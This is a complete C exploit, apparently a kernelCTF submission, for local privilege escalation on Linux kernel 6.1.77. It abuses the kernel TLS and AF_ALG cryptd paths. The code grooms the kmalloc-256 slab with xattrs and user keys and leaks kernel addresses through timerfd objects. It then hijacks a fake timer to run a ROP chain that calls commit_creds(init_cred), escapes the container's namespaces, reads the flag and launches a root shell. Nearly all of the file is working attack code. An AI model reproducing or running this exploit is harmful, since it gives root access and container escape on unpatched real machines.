#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
#include <sys/inotify.h>
#include <linux/xfrm.h>
#include <linux/pfkeyv2.h>

#include <linux/pkt_cls.h>

#include <linux/capability.h>
#include <linux/genetlink.h>
#include <keyutils.h>
#include <sys/xattr.h>
#include <err.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <linux/if_packet.h>
#include <netinet/tcp.h>
#include <linux/tls.h>
#include <linux/if_alg.h>
#include <math.h>

#include "kernelver_6.1.77.h"

static char *g_mmapped_buf;
static uint64_t g_kernel_text;
static pid_t g_sender_pid;

#ifdef DEBUG
#define err(errcode, msg, ...) \
        do { \
                perror(msg); \
                sleep(1000); \
        } while (0)
#define errx(errcode, msg, ...) \
        do { \
                puts(msg); \
                sleep(1000); \
        } while (0)
#endif

struct list_head {
        struct list_head *         next;                 /*     0   0x8 */
        struct list_head *         prev;                 /*   0x8   0x8 */

        /* size: 16, cachelines: 1, members: 2 */
        /* last cacheline: 16 bytes */
};

struct simple_xattr {
        struct list_head           list;                 /*     0  0x10 */
        char *                     name;                 /*  0x10   0x8 */
        size_t                     size;                 /*  0x18   0x8 */
        uint64_t                       value[2];              /*  0x20     0 */
};




void set_cpu(int cpu)
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        CPU_SET(cpu, &cpus);     
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

void set_cpu_all()
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        for (int i = 0; i < 4; i++)
        {
                CPU_SET(i, &cpus);     
        }
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

void get_kctf_flag()
{
        char buf[512];


        int fd = open("/flag", O_RDONLY);

        if (fd < 0)
                return;

        size_t n = read(fd, buf, sizeof(buf));
        if (n > 0) {
                printf("Flag:\n");

                write(1, buf, n);

                printf("\n");
        }

        close(fd);
}

static char *g_sh_argv[] = {"sh", NULL};

static int g_status;

#define MMAP_SIZE 0x10000
#define XATTR_HEAD_SIZE 0x20
#define KEY_HEAD_SIZE 0x18

static int g_pwned;
static char *g_rop2;
static size_t g_rop2_len;

#define ROP2_CONST_AREA 0x10
#define ROP2_CONST_OFFSET 0x200

uint64_t kaddr(uint64_t addr)
{
        return g_kernel_text + addr - 0xffffffff81000000uL;
}


void __attribute__((naked)) after_pwn()
{
// Fix user stack and recover eflags since we didn't do when returning from kernel mode
        asm volatile(
                "mov %0, %%rsp\n"
                :: "r" (g_mmapped_buf + MMAP_SIZE - 0x100)
        );
        
        g_pwned = 1;


        set_cpu(1);

        int pid = fork();

        if (!pid) {

        if (setns(open("/proc/1/ns/mnt", O_RDONLY), 0) < 0)
                perror("setns");

        setns(open("/proc/1/ns/pid", O_RDONLY), 0);
        setns(open("/proc/1/ns/net", O_RDONLY), 0);

        printf("\nGot root!!!\n");
        printf("Getting kctf flags ...\n");

        get_kctf_flag();

        printf("Launching shell, system will crash when you exit because I didn't bother with recovery ...\n");
        execve("/bin/sh", g_sh_argv, NULL);
        _exit(0);
        }

        waitpid(pid, &g_status, 0);

       

        printf("Shell exited, sleeping for 30 seconds, after that system might crash\n");

        sleep(30);
        _exit(0);
}


void rop_rax2rdi(uint64_t **rop_p)
{
        uint64_t *rop = *rop_p;

        *(uint64_t *) (g_rop2+ROP2_CONST_OFFSET) = kaddr(POP_RDI); // RCX == RW_BUFFER 

// rax -> rdi
        *rop++ = kaddr(POP_RCX);
        *rop++ = kaddr(RW_BUFFER+ROP2_CONST_OFFSET); 
        *rop++ = kaddr(PUSH_RAX_JMP_QWORD_RCX);

        *rop_p = rop;
}

size_t prepare_rop2(uint64_t *rop2)
{
        uint64_t *rop2_start = rop2;


        *rop2++ = kaddr(POP_RDI);
        *rop2++ = kaddr(INIT_CRED);
        *rop2++ = kaddr(COMMIT_CREDS);
        *rop2++ = kaddr(AUDIT_SYSCALL_EXIT);

        // Namespace escape based on code by Crusaders of Rust
        *rop2++ = kaddr(POP_RDI);
        *rop2++ = 1;
        *rop2++ = kaddr(FIND_TASK_BY_VPID);

        *rop2++ = kaddr(POP_RSI_RDI);
        *rop2++ = kaddr(INIT_NSPROXY);
        *rop2++ = 0xdeadaaaa;

        rop_rax2rdi(&rop2); // clobbers RCX


        *rop2++ = kaddr(SWITCH_TASK_NAMESPACES);

        *rop2++ = kaddr(POP_R11_R10_R9_R8_RDI_RSI_RDX_RCX);
// eflags
        *rop2++ = 0;
        rop2 += 6;

// Userspace RIP
        *rop2++ = (uint64_t) after_pwn;

        *rop2++ = kaddr(RETURN_VIA_SYSRET);

        return (char *) rop2 - (char *) rop2_start;
}


int alloc_xattr_fd_attr(int fd, char *attr, size_t size, void *buf)
{
        int res = fsetxattr(fd, attr, buf, size - XATTR_HEAD_SIZE, XATTR_CREATE);
        if (res < 0) {
               printf("attr: %s\n", attr);
                err(1, "fsetxattr");
        }

        return fd;
}

int alloc_xattr_fd(int fd, unsigned int id, size_t size, void *buf)
{
        char *attr;

        asprintf(&attr, "security.%d", id);
        alloc_xattr_fd_attr(fd, attr, size, buf);

        return fd;
}

void free_xattr_fd(int fd, int id)
{
        char *attr;

        asprintf(&attr, "security.%d", id);

        fremovexattr(fd, attr);
}


ssize_t read_xattr_fd(int fd, int id, char *buf, size_t sz)
{
        char *attr;

        asprintf(&attr, "security.%d", id);

        ssize_t ret = fgetxattr(fd, attr, buf, sz);

        if (ret < 0)
                err(1, "read_xattr_fd");

        return ret;
}

#define SLAB_256_CNT 16
#define KEY_CNT SLAB_256_CNT*3
#define A1_CNT SLAB_256_CNT*10
#define A3_CNT 1024

enum XATTR_IDX_RANGE {
        A3,
        A1,
        A2,
        A4,
        XATTR_IDX_MAX
};

#define XATTR_MAX_CHUNK 3000
#define XATTR_IDX(base, offset) (base*XATTR_MAX_CHUNK + offset)

char *g_stack1;

void setup_tls(int sock, int is_rx)
{
        if (setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0)
                err(1, "setsockopt");
        
        static struct tls12_crypto_info_aes_ccm_128 crypto_info = {.info.version = TLS_1_2_VERSION, .info.cipher_type = TLS_CIPHER_AES_CCM_128};

        if (setsockopt(sock, SOL_TLS, is_rx ? TLS_RX : TLS_TX, &crypto_info, sizeof(crypto_info)) < 0)
                err(1, "TLS_TX");
}

int sender(void *a)
{
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));

        set_cpu(1);

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(7777);

        if (connect(sock, &addr, sizeof(addr)) < 0)
                err(1, "connect");


        setup_tls(sock, 0);

        char buf[1024];
        memset(buf, 'B', sizeof(buf));
        send(sock, g_mmapped_buf, 2, 0);

        sleep(2000);
        exit(0);
}

key_serial_t alloc_key(int id, size_t len, char *buf)
{
        key_serial_t serial;
        char desc[256];
        len -= KEY_HEAD_SIZE;

        snprintf(desc, sizeof(desc), "%d", id);

        serial = syscall(SYS_add_key, "user", desc, buf, len, KEY_SPEC_PROCESS_KEYRING);

        if (serial < 0) {
                err(1, "key add");
        }

        return serial;
}

void free_key(key_serial_t key)
{
        long ret = syscall(SYS_keyctl, KEYCTL_UNLINK, key, KEY_SPEC_PROCESS_KEYRING);
        if (ret < 0) {
                perror("key unlink");
                exit(1);
        }

}

unsigned int parse_zoneinfo(char *buf, unsigned int *high, unsigned int *batch)
{
        char *t;

        t = strstr(buf, "zone   Normal");
        t = strstr(t, "cpu: 0");
        t = strstr(t, "count: ");

//        puts(t);
                
        unsigned int cnt = atoi(t+7);

        if (high) {
                t = strstr(t, "high: ");
                *high = atoi(t+6);
        }

        if (batch) {
                t = strstr(t, "batch: ");
                *batch = atoi(t+7);
        }

        return cnt;
        
}

unsigned int get_pagecount(unsigned int *high, unsigned int *batch)
{
        static char zibuf[10000];
        static int fdzi = -1;

        if (fdzi < 0) {
                fdzi = open("/proc/zoneinfo", 0, O_DIRECT);
                if (fdzi < 0)
                        err(1, "open zoneinfo");
        }

        lseek(fdzi, SEEK_SET, 0);
        read(fdzi, zibuf, sizeof(zibuf));               

        return parse_zoneinfo(zibuf, high, batch);
}

void die(char *msg)
{
        puts(msg);

        unlink("/tmp/x");
        unlink("/tmp/x2");

        kill(g_sender_pid, 9);

        int status;
        if (waitpid(g_sender_pid, &status, 0) < 0)
                err(1, "waitpid");

        exit(1);
}

void prepare_spinlock(uint64_t *lock_ptr)
{
        *lock_ptr++ = 0xdead4ead00000000;
}

void prepare_fake_timer(char *timer, uint64_t xattr_addr)
{

        g_rop2_len = prepare_rop2((uint64_t *) g_rop2);
        if (g_rop2_len > ROP2_CONST_OFFSET)
                err(1, "Stage 2 ROP size too big: %d > %d\n", g_rop2_len, ROP2_CONST_OFFSET);

        prepare_spinlock((uint64_t *) (timer + 0x88));
        prepare_spinlock((uint64_t *) (timer + 0xd0));

        *(uint64_t *) (timer+0x78) = 1;
        *(uint16_t *) (timer+0xac) = 1;
        


        *(uint64_t *) (timer + 0x20) = kaddr(POP_RSP);

// base
        *(uint64_t *) (timer + 0x30) = xattr_addr + 0xb0 - 0x30;

/*
0xffffffff81e0e2e4:     mov rsi, qword ptr [r12 + 0x48]
0xffffffff81e0e2e9:     mov rdi, qword ptr [r12 + 0x50]
0xffffffff81e0e2ee:     mov rdx, r15
0xffffffff81e0e2f1:     mov rax, qword ptr [r12 + 0x58]
0xffffffff81e0e2f6:     call    __x86_indirect_thunk_rax
*/
        *(uint64_t *) (timer + 0xb0) = kaddr(G1);

// rsi
        *(uint64_t *) (timer + 0x48) = xattr_addr + 0x20 - 0xf;
// rdi
        *(uint64_t *) (timer + 0x50) = xattr_addr + 0x60;

        *(uint64_t *) (timer + 0x58) = kaddr(PUSH_RDI_JMP_QWORD_RSI_0F);

        uint64_t *rop = (uint64_t *) (timer + 0x60);
        *rop++ = kaddr(POP_RSI_RDI_RBP);
        *rop++ = (uint64_t) g_rop2;
        *rop++ = kaddr(RW_BUFFER);
        rop += 1;
        *rop++ = kaddr(POP_RCX);
        rop += 1;
        *rop++ = kaddr(COPY_USER_GENERIC_STRING);
        *rop++ = kaddr(POP_RSP);
        *rop++ = kaddr(RW_BUFFER);
}


#define STACK_SIZE (1024 * 1024)    /* Stack size for cloned child */



int main(int argc, char **argv)
{
        setbuf(stdout, NULL);

        g_mmapped_buf = mmap(NULL, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        if (g_mmapped_buf == MAP_FAILED) {
                perror("mmap");
                return 1;
        }

        memset(g_mmapped_buf, 0, MMAP_SIZE);

#define ROP2_MMAP_SIZE 0x4000
        g_rop2 = mmap(NULL, ROP2_MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE|MAP_LOCKED, -1, 0);
        if (g_rop2 == MAP_FAILED)
                err(1, "mmap");

        struct timeval time;
        gettimeofday(&time,NULL);

        srand((time.tv_sec * 1000) + (time.tv_usec / 1000));

        set_cpu(0);

        int xattr_fd = open("/tmp/x", O_RDWR|O_CREAT);
        int xattr_fd2 = open("/tmp/x2", O_RDWR|O_CREAT);
        if (xattr_fd < 0 || xattr_fd2 < 0)
                err(1, "xattr open\n");

        struct sockaddr_alg sa = {
                .salg_family = AF_ALG,
                .salg_type = "skcipher",
                .salg_name = "cryptd(ctr(aes-generic))"
        };
        int c1 = socket(AF_ALG, SOCK_SEQPACKET, 0);

        if (bind(c1, (struct sockaddr *)&sa, sizeof(sa)) < 0)
                err(1, "af_alg bind");



        struct sockaddr_alg sa2 = {
                .salg_family = AF_ALG,
                .salg_type = "aead",
                .salg_name = "ccm_base(cryptd(ctr(aes-generic)),cbcmac(aes-aesni))"
        };

        if (bind(c1, (struct sockaddr *)&sa2, sizeof(sa)) < 0)
                err(1, "af_alg bind");

        g_stack1 = mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
        if (g_stack1 == MAP_FAILED) {
                perror("mmap stack");
                exit(1);

        }

        int sock_serv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if (sock_serv < 0)
                err(1, "socket");

        int flag = 1;
        setsockopt(sock_serv, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag));

        struct sockaddr_in addr, peer_addr;
        memset(&addr, 0, sizeof(addr));

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(7777);

        if (bind(sock_serv, &addr, sizeof(addr)) < 0)
                err(1, "connect");

        listen(sock_serv, 99999);

        g_sender_pid = clone(sender, g_stack1 + STACK_SIZE, CLONE_FS | CLONE_FILES | CLONE_VM | SIGCHLD, NULL);

        if (g_sender_pid < 0)
                err(1, "clone sender");

        socklen_t sz;
        int sock = accept(sock_serv, &peer_addr, &sz);

        if (sock < 0)
                err(1, "accept");

        setup_tls(sock, 1);


// Make sure the first key below won't trigger key_jar slab allocation that would steal our page
        key_serial_t k1 = alloc_key(10000, 32, g_mmapped_buf);
        free_key(k1);

        sleep(2);

        int pcnt1 = get_pagecount(NULL, NULL);
        unsigned int detected = 0;

        for (int i = 0; i < A1_CNT; i++)
        {
                alloc_xattr_fd(xattr_fd, XATTR_IDX(A1, i), 197, g_mmapped_buf);
                int pcnt2 = get_pagecount(NULL, NULL);

                if ((pcnt1-pcnt2) == 1) {
                        detected = 1;
                        break;
                }

                pcnt1 = pcnt2;
                        
        }

        if (!detected)
                die("Unable to detect new kmalloc-256 slab");

        memset(g_mmapped_buf, 'A', 256);

        for (int i = 0; i < SLAB_256_CNT-1; i++)
        {
                alloc_xattr_fd(xattr_fd, XATTR_IDX(A2, i), 197, g_mmapped_buf);
                        
        }

        recv(sock, g_mmapped_buf, 1, 0);
        key_serial_t keys[KEY_CNT];

        memset(g_mmapped_buf, 'K', 256);

        for (int i = 0; i < KEY_CNT; i++)
        {
                keys[i] = alloc_key(i, 197, g_mmapped_buf);
        }

        recv(sock, g_mmapped_buf, 1, 0);

        memset(g_mmapped_buf, 'B', 256);
        for (int i = 0; i < A3_CNT; i++)
        {
                *(uint64_t *) g_mmapped_buf = i;
                alloc_xattr_fd(xattr_fd, XATTR_IDX(A3, i), 197, g_mmapped_buf);
        }
        

        struct simple_xattr xattrs[A3_CNT];
        memset(xattrs, 0, sizeof(xattrs));
        unsigned int xattr_ids[KEY_CNT*A3_CNT];
        memset(xattr_ids, 0, sizeof(xattr_ids));

        unsigned int id_cnt = 0;

        for (int i = 0; i < KEY_CNT; i++)
        {
                memset(g_mmapped_buf, 0, MMAP_SIZE);

                size_t sz = keyctl_read(keys[i], g_mmapped_buf, MMAP_SIZE);
                if (sz <= 173)
                        continue;

                for (int j = 0; j < MMAP_SIZE - 0x30; j += 8)
                {
                        struct simple_xattr *x = (struct simple_xattr *) (g_mmapped_buf + j);
                        uint64_t id = x->value[0];

                        if (id && id < A3_CNT && x->value[1] == 0x4242424242424242L) {
                                x->value[0] = i;
                                xattrs[id] = *x;
                                xattr_ids[id_cnt++] = id;
                        }
                }
                                
        }
  
        int target_xattr = -1;
        uint64_t xattr_addr;
        unsigned int our_key;

        for (int id = 0; id < A3_CNT; id++)
        {
                struct simple_xattr *x = &xattrs[id];

                if (!x->name)
                        continue;

                if (id < (A3_CNT-1) && xattrs[id+1].list.next) {
                        xattr_addr = (uint64_t) xattrs[id+1].list.next;
                        target_xattr = id;
                        our_key = x->value[0];
                        break;
                } else if (id > 0 && xattrs[id-1].list.prev) {
                        xattr_addr = (uint64_t) xattrs[id-1].list.prev;
                        target_xattr = id;
                        our_key = x->value[0];
                        break;
                }
        }

        if (target_xattr < 0)
                die("Leak 1 failed");

        printf("Found target xattr %d at %p\n", target_xattr, xattr_addr);

        free_xattr_fd(xattr_fd, XATTR_IDX(A3, target_xattr));

        struct itimerspec its = { 0 };

        its.it_value.tv_sec = 999999;
#define TFD_CNT 64
        int tfds[TFD_CNT];
        for (int i = 0; i < TFD_CNT; i++)
        {
                tfds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
                timerfd_settime(tfds[i], 0, &its, NULL);
        }

        size_t sz2 = keyctl_read(keys[our_key], g_mmapped_buf, MMAP_SIZE);
        unsigned int found_kleak = 0;

        if (sz2 > 173) {
                for (int j = 0; j < MMAP_SIZE; j += 8)
                {
                        uint64_t *p = (uint64_t *) (g_mmapped_buf + j);
                        if (*p && (*p & 0xfff) == (TIMERFD_TMRPROC & 0xfff)) {
                                g_kernel_text = *p - (TIMERFD_TMRPROC - 0xffffffff81000000L);
                                found_kleak = 1;
                                printf("Found timer function: %p at offset %d kernel text: %p\n", *p, j, g_kernel_text);
                                break;
                        }
                }
        }

        if (!found_kleak)
                die("Leak 2 failed");

        memset(g_mmapped_buf, 'D', 256);


        struct itimerspec its3;
        memset(&its3, 0, sizeof(its3));

// Disarm timers
        for (int i = 0; i < TFD_CNT; i++)
        {
                timerfd_settime(tfds[i],  TFD_TIMER_ABSTIME, &its3, NULL);
        }

        for (int i = 0; i < KEY_CNT; i++)
        {
                free_key(keys[i]);
        }
         
        sleep(2);

        memset(g_mmapped_buf, 'C', 256);
        prepare_fake_timer(g_mmapped_buf - 0x20, xattr_addr);

        for (int i = 0; i < KEY_CNT*4; i++)
        {
                alloc_xattr_fd(xattr_fd2, XATTR_IDX(A4, i), 224, g_mmapped_buf);
        }


        for (int i = 0; i < TFD_CNT; i++)
        {
                timerfd_gettime(tfds[i], &its3);
        }
        
        if (!g_pwned) {
                printf("Failed to trigger vuln, try again!\n");
                _exit(0);
        }

// Can't exit, everything might crash
        while (1) 
                sleep(1000);

        return 0;
}
